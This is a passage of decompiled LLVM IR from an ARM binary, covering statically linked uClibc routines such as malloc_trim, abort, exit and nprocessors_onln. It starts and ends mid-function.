  %v2_15160 = inttoptr i32 %v1_15160 to i32*
  %v3_15160 = load i32, i32* %v2_15160, align 4
  store i32 %v3_15160, i32* %r2.global-to-local, align 4
  %v1_15164 = add i32 %v3_15160, 12
  %v2_15164 = inttoptr i32 %v1_15164 to i32*
  %v3_15164 = load i32, i32* %v2_15164, align 4
  store i32 %v3_15164, i32* %r4.global-to-local, align 4
  %v9_15168 = icmp eq i32 %v3_15164, %v2_1515c
  %v1_1516c = add i32 %v2_1515c, 12
  %v2_1516c = inttoptr i32 %v1_1516c to i32*
  %v3_1516c = load i32, i32* %v2_1516c, align 4
  store i32 %v3_1516c, i32* %r0.global-to-local, align 4
  br i1 %v9_15168, label %dec_label_pc_15174, label %dec_label_pc_151d8

dec_label_pc_15174:                               ; preds = %dec_label_pc_15158
  %v1_15174 = add i32 %v3_1516c, 8
  %v2_15174 = inttoptr i32 %v1_15174 to i32*
  %v3_15174 = load i32, i32* %v2_15174, align 4
  store i32 %v3_15174, i32* %r3.global-to-local, align 4
  %v9_15178 = icmp eq i32 %v3_15174, %v2_1515c
  br i1 %v9_15178, label %dec_label_pc_15180, label %dec_label_pc_151d8

dec_label_pc_15180:                               ; preds = %dec_label_pc_15174
  store i32 %v3_15160, i32* %v2_15174, align 4
  %v0_15184 = load i32, i32* %r0.global-to-local, align 4
  %v1_15184 = load i32, i32* %r2.global-to-local, align 4
  %v2_15184 = add i32 %v1_15184, 12
  %v3_15184 = inttoptr i32 %v2_15184 to i32*
  store i32 %v0_15184, i32* %v3_15184, align 4
  %v0_15188 = load i32, i32* %ip.global-to-local, align 4
  %v1_15188 = load i32, i32* %r1.global-to-local, align 4
  %v2_15188 = add i32 %v1_15188, %v0_15188
  store i32 %v2_15188, i32* %ip.global-to-local, align 4
  %v0_15198.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1519c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1518c

dec_label_pc_1518c:                               ; preds = %dec_label_pc_1513c, %dec_label_pc_15180
  %v0_15218 = phi i32 [ %v1_15148, %dec_label_pc_1513c ], [ %v2_15188, %dec_label_pc_15180 ]
  %v0_1519c = phi i32 [ %v3_15150, %dec_label_pc_1513c ], [ %v0_1519c.pre, %dec_label_pc_15180 ]
  %v1_151b0 = phi i32 [ %v2_15148, %dec_label_pc_1513c ], [ %v0_15198.pre, %dec_label_pc_15180 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_15190 = load i32, i32* @r7, align 4
  %v2_15190 = add i32 %v0_15190, 64
  %v3_15190 = inttoptr i32 %v2_15190 to i32*
  %v4_15190 = load i32, i32* %v3_15190, align 4
  store i32 %v4_15190, i32* %r2.global-to-local, align 4
  %v1_15194 = add i32 %v4_15190, 44
  %v2_15194 = inttoptr i32 %v1_15194 to i32*
  %v3_15194 = load i32, i32* %v2_15194, align 4
  store i32 %v3_15194, i32* %r3.global-to-local, align 4
  %v9_15198 = icmp eq i32 %v1_151b0, %v3_15194
  %v1_1519c = and i32 %v0_1519c, -4
  store i32 %v1_1519c, i32* %r0.global-to-local, align 4
  br i1 %v9_15198, label %dec_label_pc_15218, label %dec_label_pc_151a4

dec_label_pc_151a4:                               ; preds = %dec_label_pc_1518c
  %v2_151a4 = add i32 %v1_151b0, %v1_1519c
  store i32 %v2_151a4, i32* %r3.global-to-local, align 4
  %v1_151a8 = add i32 %v2_151a4, 4
  %v2_151a8 = inttoptr i32 %v1_151a8 to i32*
  %v3_151a8 = load i32, i32* %v2_151a8, align 4
  store i32 %v3_151a8, i32* %r3.global-to-local, align 4
  %v1_151ac = urem i32 %v3_151a8, 2
  %v2_151ac = icmp eq i32 %v1_151ac, 0
  %v2_151b0 = add i32 %v1_151b0, 4
  %v3_151b0 = inttoptr i32 %v2_151b0 to i32*
  store i32 %v1_1519c, i32* %v3_151b0, align 4
  br i1 %v2_151ac, label %dec_label_pc_151b8, label %dec_label_pc_151a4.dec_label_pc_151e8_crit_edge

dec_label_pc_151a4.dec_label_pc_151e8_crit_edge:  ; preds = %dec_label_pc_151a4
  %v0_151f8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_151e8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151a4
  %v0_151b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_151b8 = add i32 %v0_151b8, 8
  %v2_151b8 = inttoptr i32 %v1_151b8 to i32*
  %v3_151b8 = load i32, i32* %v2_151b8, align 4
  store i32 %v3_151b8, i32* %r1.global-to-local, align 4
  %v1_151bc = add i32 %v3_151b8, 12
  %v2_151bc = inttoptr i32 %v1_151bc to i32*
  %v3_151bc = load i32, i32* %v2_151bc, align 4
  store i32 %v3_151bc, i32* %r3.global-to-local, align 4
  %v9_151c0 = icmp eq i32 %v3_151bc, %v0_151b8
  %v1_151c4 = add i32 %v0_151b8, 12
  %v2_151c4 = inttoptr i32 %v1_151c4 to i32*
  %v3_151c4 = load i32, i32* %v2_151c4, align 4
  store i32 %v3_151c4, i32* %r2.global-to-local, align 4
  br i1 %v9_151c0, label %dec_label_pc_151cc, label %dec_label_pc_151d8

dec_label_pc_151cc:                               ; preds = %dec_label_pc_151b8
  %v1_151cc = add i32 %v3_151c4, 8
  %v2_151cc = inttoptr i32 %v1_151cc to i32*
  %v3_151cc = load i32, i32* %v2_151cc, align 4
  store i32 %v3_151cc, i32* %r3.global-to-local, align 4
  %v9_151d0 = icmp eq i32 %v3_151cc, %v0_151b8
  br i1 %v9_151d0, label %dec_label_pc_151dc, label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151b8, %dec_label_pc_15174, %dec_label_pc_15158, %dec_label_pc_151cc
  %v0_151d8 = call i32 @abort()
  store i32 %v0_151d8, i32* %r0.global-to-local, align 4
  %v0_151dc.pre = load i32, i32* @r1, align 4
  %v1_151dc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151cc, %dec_label_pc_151d8
  %v1_151dc = phi i32 [ %v3_151c4, %dec_label_pc_151cc ], [ %v1_151dc.pre, %dec_label_pc_151d8 ]
  %v0_151dc = phi i32 [ %v3_151b8, %dec_label_pc_151cc ], [ %v0_151dc.pre, %dec_label_pc_151d8 ]
  %v2_151dc = add i32 %v1_151dc, 8
  %v3_151dc = inttoptr i32 %v2_151dc to i32*
  store i32 %v0_151dc, i32* %v3_151dc, align 4
  %v0_151e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_151e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_151e0 = add i32 %v1_151e0, 12
  %v3_151e0 = inttoptr i32 %v2_151e0 to i32*
  store i32 %v0_151e0, i32* %v3_151e0, align 4
  %v0_151e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_151e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_151e4 = add i32 %v1_151e4, %v0_151e4
  store i32 %v2_151e4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_151e8

dec_label_pc_151e8:                               ; preds = %dec_label_pc_151a4.dec_label_pc_151e8_crit_edge, %dec_label_pc_151dc
  %v0_151f8 = phi i32 [ %v0_151f8.pre, %dec_label_pc_151a4.dec_label_pc_151e8_crit_edge ], [ %v2_151e4, %dec_label_pc_151dc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_151ec = load i32, i32* @r7, align 4
  %v2_151ec = add i32 %v0_151ec, 64
  %v3_151ec = inttoptr i32 %v2_151ec to i32*
  %v4_151ec = load i32, i32* %v3_151ec, align 4
  %v1_151f0 = add i32 %v4_151ec, 52
  store i32 %v1_151f0, i32* %r3.global-to-local, align 4
  %v1_151f4 = add i32 %v4_151ec, 60
  %v2_151f4 = inttoptr i32 %v1_151f4 to i32*
  %v3_151f4 = load i32, i32* %v2_151f4, align 4
  store i32 %v3_151f4, i32* %r1.global-to-local, align 4
  %v1_151f8 = or i32 %v0_151f8, 1
  store i32 %v1_151f8, i32* %r2.global-to-local, align 4
  %v1_151fc = load i32, i32* %r4.global-to-local, align 4
  %v2_151fc = add i32 %v1_151fc, 12
  %v3_151fc = inttoptr i32 %v2_151fc to i32*
  store i32 %v1_151f0, i32* %v3_151fc, align 4
  %v0_15200 = load i32, i32* %r1.global-to-local, align 4
  %v1_15200 = load i32, i32* %r4.global-to-local, align 4
  %v2_15200 = add i32 %v1_15200, 8
  %v3_15200 = inttoptr i32 %v2_15200 to i32*
  store i32 %v0_15200, i32* %v3_15200, align 4
  %v0_15204 = load i32, i32* %r2.global-to-local, align 4
  %v1_15204 = load i32, i32* %r4.global-to-local, align 4
  %v2_15204 = add i32 %v1_15204, 4
  %v3_15204 = inttoptr i32 %v2_15204 to i32*
  store i32 %v0_15204, i32* %v3_15204, align 4
  %v0_15208 = load i32, i32* %ip.global-to-local, align 4
  %v1_15208 = load i32, i32* %r4.global-to-local, align 4
  %v3_15208 = add i32 %v1_15208, %v0_15208
  %v4_15208 = inttoptr i32 %v3_15208 to i32*
  store i32 %v0_15208, i32* %v4_15208, align 4
  %v0_1520c = load i32, i32* %r4.global-to-local, align 4
  %v1_1520c = load i32, i32* %r1.global-to-local, align 4
  %v2_1520c = add i32 %v1_1520c, 12
  %v3_1520c = inttoptr i32 %v2_1520c to i32*
  store i32 %v0_1520c, i32* %v3_1520c, align 4
  %v0_15210 = load i32, i32* %r4.global-to-local, align 4
  %v1_15210 = load i32, i32* %r3.global-to-local, align 4
  %v2_15210 = add i32 %v1_15210, 8
  %v3_15210 = inttoptr i32 %v2_15210 to i32*
  store i32 %v0_15210, i32* %v3_15210, align 4
  br label %dec_label_pc_15228

dec_label_pc_15218:                               ; preds = %dec_label_pc_1518c
  %v2_15218 = add i32 %v1_1519c, %v0_15218
  store i32 %v2_15218, i32* %ip.global-to-local, align 4
  %v1_1521c = or i32 %v2_15218, 1
  store i32 %v1_1521c, i32* %r3.global-to-local, align 4
  %v0_15220 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15220, i32* %v2_15194, align 4
  %v0_15224 = load i32, i32* %r3.global-to-local, align 4
  %v1_15224 = load i32, i32* %r4.global-to-local, align 4
  %v2_15224 = add i32 %v1_15224, 4
  %v3_15224 = inttoptr i32 %v2_15224 to i32*
  store i32 %v0_15224, i32* %v3_15224, align 4
  br label %dec_label_pc_15228

dec_label_pc_15228:                               ; preds = %dec_label_pc_151e8, %dec_label_pc_15218
  %v0_15228 = load i32, i32* %ip.global-to-local, align 4
  %v3_1522c = icmp ult i32 %v0_15228, 131070
  br i1 %v3_1522c, label %dec_label_pc_15298, label %dec_label_pc_15230

dec_label_pc_15230:                               ; preds = %dec_label_pc_15228
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_15234 = load i32, i32* @r7, align 4
  %v2_15234 = add i32 %v0_15234, 64
  %v3_15234 = inttoptr i32 %v2_15234 to i32*
  %v4_15234 = load i32, i32* %v3_15234, align 4
  store i32 %v4_15234, i32* @r4, align 4
  %v1_15238 = inttoptr i32 %v4_15234 to i32*
  %v2_15238 = load i32, i32* %v1_15238, align 4
  store i32 %v2_15238, i32* %r3.global-to-local, align 4
  %v1_1523c = and i32 %v2_15238, 2
  %v2_1523c = icmp eq i32 %v1_1523c, 0
  br i1 %v2_1523c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_15230
  store i32 %v4_15234, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_15230, %bb
  %v1_15244 = xor i1 %v2_1523c, true
  call void @__pseudo_cond_branch(i1 %v1_15244, i32 ptrtoint (i32* @global_var_14ee8.882 to i32))
  %v0_15248 = load i32, i32* @r4, align 4
  %v1_15248 = add i32 %v0_15248, 44
  %v2_15248 = inttoptr i32 %v1_15248 to i32*
  %v3_15248 = load i32, i32* %v2_15248, align 4
  store i32 %v3_15248, i32* %r3.global-to-local, align 4
  %v1_1524c = add i32 %v3_15248, 4
  %v2_1524c = inttoptr i32 %v1_1524c to i32*
  %v3_1524c = load i32, i32* %v2_1524c, align 4
  store i32 %v3_1524c, i32* %r3.global-to-local, align 4
  %v1_15250 = add i32 %v0_15248, 836
  %v2_15250 = inttoptr i32 %v1_15250 to i32*
  %v3_15250 = load i32, i32* %v2_15250, align 4
  store i32 %v3_15250, i32* %r2.global-to-local, align 4
  %v1_15254 = and i32 %v3_1524c, -4
  store i32 %v1_15254, i32* %r3.global-to-local, align 4
  %v3_15258 = icmp ult i32 %v1_15254, %v3_15250
  br i1 %v3_15258, label %dec_label_pc_15298, label %dec_label_pc_15260

dec_label_pc_15260:                               ; preds = %bb16
  store i32 %v0_15248, i32* %r1.global-to-local, align 4
  %v1_15264 = add i32 %v0_15248, 840
  %v2_15264 = inttoptr i32 %v1_15264 to i32*
  %v3_15264 = load i32, i32* %v2_15264, align 4
  store i32 %v3_15264, i32* %r0.global-to-local, align 4
  %v2_15268 = call i32 @__malloc_trim(i32 %v3_15264, i32 %v0_15248)
  store i32 %v2_15268, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15298

dec_label_pc_15270:                               ; preds = %dec_label_pc_15134
  %v2_15270 = inttoptr i32 %v1_15104 to i32*
  %v3_15270 = load i32, i32* %v2_15270, align 4
  store i32 %v3_15270, i32* %r0.global-to-local, align 4
  %v1_15274 = add i32 %v4_150f4, 848
  %v2_15274 = inttoptr i32 %v1_15274 to i32*
  %v3_15274 = load i32, i32* %v2_15274, align 4
  store i32 %v3_15274, i32* %r2.global-to-local, align 4
  %v1_15278 = add i32 %v4_150f4, 868
  %v2_15278 = inttoptr i32 %v1_15278 to i32*
  %v3_15278 = load i32, i32* %v2_15278, align 4
  %v2_1527c = add i32 %v3_15270, %v1_15100
  store i32 %v2_1527c, i32* %r1.global-to-local, align 4
  %v1_15280 = add i32 %v3_15274, -1
  store i32 %v1_15280, i32* %r2.global-to-local, align 4
  %v2_15284 = sub i32 %v3_15278, %v2_1527c
  store i32 %v2_15284, i32* %r3.global-to-local, align 4
  store i32 %v2_15284, i32* %v2_15278, align 4
  %v1_1528c = load i32, i32* @lr, align 4
  %v2_1528c = add i32 %v1_1528c, 848
  %v3_1528c = inttoptr i32 %v2_1528c to i32*
  store i32 %v1_15280, i32* %v3_1528c, align 4
  %v0_15290 = load i32, i32* %r0.global-to-local, align 4
  %v1_15290 = load i32, i32* @r5, align 4
  %v2_15290 = sub i32 %v1_15290, %v0_15290
  store i32 %v2_15290, i32* %r0.global-to-local, align 4
  %v4_15294 = call i32 @munmap(i32 %v2_15290, i32 %v2_1527c, i32 %v1_15280, i32 %v2_15284)
  store i32 %v4_15294, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %bb16, %dec_label_pc_15228, %dec_label_pc_15260, %dec_label_pc_15114, %dec_label_pc_15270
  store i32 %v2_150a8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_152a4 = load i32, i32* @r7, align 4
  %v2_152a4 = add i32 %v0_152a4, 44
  %v3_152a4 = inttoptr i32 %v2_152a4 to i32*
  %v4_152a4 = load i32, i32* %v3_152a4, align 4
  store i32 %v4_152a4, i32* %ip.global-to-local, align 4
  store i32 86704, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_152a4)
  br label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %entry, %dec_label_pc_15298
  store i32 %v3_1509c, i32* @r4, align 4
  store i32 %v6_1509c, i32* @r5, align 4
  store i32 %v9_1509c, i32* @r6, align 4
  store i32 %v12_1509c, i32* @r7, align 4
  store i32 %v18_1509c, i32* @lr, align 4
  ret i32 %v2_150a8

; uselistorder directives
  uselistorder i32 %v0_15248, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_15208, { 1, 0 }
  uselistorder i32 %v1_15148, { 1, 0 }
  uselistorder i32 %v0_15148, { 1, 0 }
  uselistorder i32 %v3_1511c, { 1, 0 }
  uselistorder i32 %v1_15100, { 1, 0, 2 }
  uselistorder i32 %v2_150fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_150f4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_150a4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_152b0, { 1, 0 }
  uselistorder label %dec_label_pc_15298, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_15228, { 1, 0 }
  uselistorder label %dec_label_pc_151e8, { 1, 0 }
  uselistorder label %dec_label_pc_151dc, { 1, 0 }
  uselistorder label %dec_label_pc_151d8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1518c, { 1, 0 }
}

define i32 @function_152c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_152c0:
  %v0_152c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_152c0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_152c0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_152c0, %bb
  %v4_152d4 = phi i32 [ %arg1, %dec_label_pc_152c0 ], [ 0, %bb ]
  ret i32 %v4_152d4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_152d8 = load i32, i32* @r4, align 4
  store i32 %v3_152d8, i32* %stack_var_-12, align 4
  %v6_152d8 = load i32, i32* @r5, align 4
  %v4_152e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_152e8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_152e8, i32* @r0, align 4
  %v0_152f8 = call i32 @__malloc_consolidate()
  %v0_152fc = load i32, i32* @r4, align 4
  store i32 %v0_152fc, i32* %r0.global-to-local, align 4
  %v0_15300 = load i32, i32* @r5, align 4
  %v2_15308 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15308, i32* @r4, align 4
  store i32 %v6_152d8, i32* @r5, align 4
  %v2_1530c = call i32 @__malloc_trim(i32 %v0_152fc, i32 %v0_15300)
  store i32 %v2_1530c, i32* %r0.global-to-local, align 4
  %v0_15310 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15310, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_15310 = load i32, i32* @ip, align 4
  %v5_15310 = mul i32 %v2_15310, 8
  %v6_15310 = and i32 %v5_15310, %v2_1530c
  call void @__pseudo_branch(i32 %v6_15310)
  %v0_15314.pr = load i1, i1* @cpsr_z, align 1
  %v2_15314 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_15314.pr, label %bb6, label %.thread

bb6:                                              ; preds = %bb
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %entry, %bb6
  %v4_15314 = phi i32 [ %v2_1530c, %entry ], [ 0, %bb6 ], [ %v2_15314, %bb ]
  ret i32 %v4_15314

; uselistorder directives
  uselistorder i32 %v2_1530c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 4, 2, 0 }
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r5, align 4
  %v4_15330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 16) to i32*), align 4
  store i32 86844, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15330)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_15358 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_15360 = load i32, i32* @r5, align 4
  %v2_15360 = add i32 %v0_15360, 636
  %v3_15360 = inttoptr i32 %v2_15360 to i32*
  %v4_15360 = load i32, i32* %v3_15360, align 4
  %v2_15364 = icmp eq i32 %v4_15360, 0
  br i1 %v2_15364, label %dec_label_pc_1536c, label %dec_label_pc_153ac

dec_label_pc_1536c:                               ; preds = %entry
  store i32 1, i32* %v3_15360, align 4
  br label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_153bc, %dec_label_pc_1536c
  %v0_15378 = load i32, i32* @r5, align 4
  %v2_15378 = add i32 %v0_15378, 212
  store i32 %v2_15378, i32* @r4, align 4
  %v2_15384 = add i32 %v0_15378, 68
  %v3_15384 = inttoptr i32 %v2_15384 to i32*
  %v4_15384 = load i32, i32* %v3_15384, align 4
  call void @__pseudo_branch(i32 %v4_15384)
  %v1_15394 = call i32 @__GI_raise(i32 6)
  %v0_153a0 = load i32, i32* @r5, align 4
  %v2_153a0 = add i32 %v0_153a0, 16
  %v3_153a0 = inttoptr i32 %v2_153a0 to i32*
  %v4_153a0 = load i32, i32* %v3_153a0, align 4
  store i32 86956, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_153a0)
  %v0_153b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %entry, %dec_label_pc_15374
  %v1_153c4 = phi i32 [ %v0_15360, %entry ], [ %v0_153b0.pre, %dec_label_pc_15374 ]
  %v2_153b0 = add i32 %v1_153c4, 636
  %v3_153b0 = inttoptr i32 %v2_153b0 to i32*
  %v4_153b0 = load i32, i32* %v3_153b0, align 4
  %v7_153b4 = icmp eq i32 %v4_153b0, 1
  br i1 %v7_153b4, label %dec_label_pc_153bc, label %dec_label_pc_153f8

dec_label_pc_153bc:                               ; preds = %dec_label_pc_153ac
  %v2_153bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_153bc, i32* @r4, align 4
  store i32 2, i32* %v3_153b0, align 4
  %v3_153d4 = bitcast i32* %stack_var_-28 to i8*
  %v4_153d4 = call i32 @__GI_memset(i8* %v3_153d4, i32 0, i32 20)
  %v3_153f0 = call i32 @__libc_sigaction(i32 6, i32 %v2_153bc, i32 0)
  br label %dec_label_pc_15374

dec_label_pc_153f8:                               ; preds = %dec_label_pc_153ac
  %v7_153f8 = icmp eq i32 %v4_153b0, 2
  br i1 %v7_153f8, label %dec_label_pc_15400, label %dec_label_pc_1540c

dec_label_pc_15400:                               ; preds = %dec_label_pc_153f8
  store i32 3, i32* %v3_153b0, align 4
  %v0_15408 = call i32 @abort()
  %v0_1540c.pre = load i32, i32* @r5, align 4
  %v1_1540c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1540c

dec_label_pc_1540c:                               ; preds = %dec_label_pc_153f8, %dec_label_pc_15400
  %v3_15418 = phi i32 [ 636, %dec_label_pc_153f8 ], [ %v1_1540c.pre, %dec_label_pc_15400 ]
  %v2_15418 = phi i32 [ %v1_153c4, %dec_label_pc_153f8 ], [ %v0_1540c.pre, %dec_label_pc_15400 ]
  %v2_1540c = add i32 %v2_15418, %v3_15418
  %v3_1540c = inttoptr i32 %v2_1540c to i32*
  %v4_1540c = load i32, i32* %v3_1540c, align 4
  %v7_15410 = icmp eq i32 %v4_1540c, 3
  br i1 %v7_15410, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1540c
  store i32 4, i32* %v3_1540c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1540c, %bb
  call void @__pseudo_cond_branch(i1 %v7_15410, i32 ptrtoint (i32* @global_var_16de0.892 to i32))
  br label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %dec_label_pc_15424, %.thread2
  %v0_15424 = call i32 @abort()
  br label %dec_label_pc_15424

; uselistorder directives
  uselistorder i32* %v3_153b0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1540c, { 1, 0 }
  uselistorder label %dec_label_pc_153ac, { 1, 0 }
}

define i32 @function_15430(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15430:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_15430 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15430, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15430
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15430, %bb
  %v4_1543c = phi i32 [ %tmp, %dec_label_pc_15430 ], [ 0, %bb ]
  ret i32 %v4_1543c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r5, align 4
  %v4_1544c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 140) to i32*), align 4
  store i32 %v4_1544c, i32* @r4, align 4
  %v2_15454 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_1546c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1546c)
  %v0_15480 = load i32, i32* @r5, align 4
  %v2_15480 = add i32 %v0_15480, 16
  %v3_15480 = inttoptr i32 %v2_15480 to i32*
  %v4_15480 = load i32, i32* %v3_15480, align 4
  call void @__pseudo_branch(i32 %v4_15480)
  %v0_15490 = load i32, i32* @r5, align 4
  %v2_15490 = add i32 %v0_15490, 640
  %v3_15490 = inttoptr i32 %v2_15490 to i32*
  %v4_15490 = load i32, i32* %v3_15490, align 4
  %v2_15498 = icmp eq i32 %v4_15490, 0
  br i1 %v2_15498, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_154a4 = xor i1 %v2_15498, true
  call void @__pseudo_cond_branch(i1 %v2_154a4, i32 %v4_15490)
  store i32 %v2_15454, i32* @r0, align 4
  %v0_154b4 = load i32, i32* @r5, align 4
  %v2_154b4 = add i32 %v0_154b4, 44
  %v3_154b4 = inttoptr i32 %v2_154b4 to i32*
  %v4_154b4 = load i32, i32* %v3_154b4, align 4
  call void @__pseudo_branch(i32 %v4_154b4)
  %v0_154c0 = call i32 @__GI___uClibc_fini()
  %v0_154c8 = load i32, i32* @r5, align 4
  %v2_154c8 = add i32 %v0_154c8, -50228
  %v2_154d0 = icmp eq i32 %v2_154c8, 0
  br i1 %v2_154d0, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_154d8 = xor i1 %v2_154d0, true
  call void @__pseudo_cond_branch(i1 %v2_154d8, i32 %v2_154c8)
  %v0_154dc = load i32, i32* @r6, align 4
  %v1_154e0 = call i32 @__GI__exit(i32 %v0_154dc)
  %v0_154e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_154e4, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v5_154e4 = call i32 @__libc_errno(i32 %v1_154e0)
  %v0_154e8.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_154e8.pr, label %bb11, label %.thread6

bb11:                                             ; preds = %bb10
  br label %.thread6

.thread6:                                         ; preds = %bb10, %bb9, %bb11
  %v4_154fc = phi i32 [ %v5_154e4, %bb10 ], [ %v1_154e0, %bb9 ], [ 0, %bb11 ]
  ret i32 %v4_154fc

; uselistorder directives
  uselistorder label %.thread6, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -34008), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_15524 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -34008))
  store i32 %v1_15524, i32* @r6, align 4
  %v2_15528 = icmp eq i32 %v1_15524, 0
  br i1 %v2_15528, label %dec_label_pc_155a8, label %dec_label_pc_15530

